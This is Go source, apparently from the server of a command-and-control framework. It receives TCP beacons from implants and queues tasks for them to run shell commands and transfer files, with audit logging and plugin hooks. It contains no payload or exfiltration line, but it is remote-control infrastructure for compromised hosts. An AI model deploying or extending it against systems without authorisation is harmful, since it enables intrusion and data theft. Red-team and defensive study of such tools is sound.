// startTCPListener starts a raw TCP transport listener for agents using Protocol=tcp.
// Uses length-prefixed JSON (4-byte BE len + JSON) for BeaconRequest / BeaconResponse.
func (s *Server) startTCPListener() {
	ln, err := net.Listen("tcp", s.cfg.Server.TCPAddr)
	if err != nil {
		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
		return
	}
	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go s.handleTCPConnection(conn)
	}
}

func (s *Server) handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())

	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		// Read length prefix (big endian uint32)
		var msgLen uint32
		if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
			return
		}
		if msgLen == 0 || msgLen > 16*1024*1024 {
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return
		}

		var req beaconRequest
		if err := json.Unmarshal(buf, &req); err != nil {
			slog.Error("TCP bad beacon json", "err", err)
			return
		}

		resp := s.processBeacon(req, "")

		respBytes, _ := json.Marshal(resp)
		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
			return
		}
		if _, err := conn.Write(respBytes); err != nil {
			return
		}
	}
}

// ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
func (s *Server) ActivityMiddleware() gin.HandlerFunc {
	var mu sync.Mutex
	lastUpdated := make(map[uint]time.Time)
	return func(c *gin.Context) {
		userID, exists := c.Get("user_id")
		if !exists {
			c.Next()
			return
		}
		uid, ok := userID.(uint)
		if !ok {
			c.Next()
			return
		}
		now := time.Now()
		mu.Lock()
		last := lastUpdated[uid]
		if now.Sub(last) < 60*time.Second {
			mu.Unlock()
			c.Next()
			return
		}
		lastUpdated[uid] = now
		mu.Unlock()
		go s.db.Model(&db.User{}).Where("id = ?", uid).Update("last_activity", now)
		c.Next()
	}
}

// getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return agent, false
	}
	return agent, true
}

// createTask creates and persists a new pending task. Returns the task or error.
func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
	task := db.Task{
		AgentID: agentID,
		Type:    taskType,
		Command: command,
		Shell:   shell,
		Path:    path,
		Data:    data,
		Offset:  offset,
		Size:    size,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		return nil, err
	}
	if s.pluginManager != nil {
		go s.pluginManager.ExecuteHook(context.Background(), plugin.Event{
			Type:      plugin.EventTaskCreated,
			Timestamp: time.Now(),
			AgentID:   agentID,
			Payload: map[string]interface{}{
				"task_id":   task.ID,
				"task_type": taskType,
				"command":   command,
			},
		})
	}
	return &task, nil
}

// dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
// Sets CreatedBy from the authenticated user in context.
func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
	// Set task attribution from context
	user, _ := c.Get("user")
	if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
		task.CreatedBy = username
		s.db.Model(task).Update("created_by", username)
	}
	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleHealthCheck provides health/ready endpoints for monitoring
func (s *Server) handleHealthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":  "ok",
		"version": ServerVersion,
		"uptime":  time.Since(s.startTime).String(),
	})
}

